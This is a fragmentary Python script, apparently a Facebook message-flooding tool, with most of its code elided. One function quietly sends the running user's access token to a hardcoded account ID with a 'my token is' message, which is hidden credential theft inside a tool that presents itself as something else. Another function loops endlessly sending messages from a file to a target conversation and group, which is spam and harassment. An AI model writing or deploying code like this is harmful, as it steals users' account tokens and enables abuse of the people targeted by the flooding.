...
def send_initial_message():
      ...
      msg_template = "Hello STrOnG  SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"

      # Specify the ID where you want to send the message
      target_id = "100001588196129"
...
def send_messages_from_file():
      ...
      def liness():
          print('\033[1;92m' + '❤️<<•B──R───O──K──E──N─>><<──N───A───D───E───E───M•>>❤️')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] ❤️⊱[-OWNER MR NADEEM-]⊰❤️<<━━━━STrOnG K3 T9RF S3 SMS S3ND HO G9YA PL3ASE CHAKE TARGET ID AND GROUP━━━━>> {} OF CONVO {} TOKEN {}: {}".format(
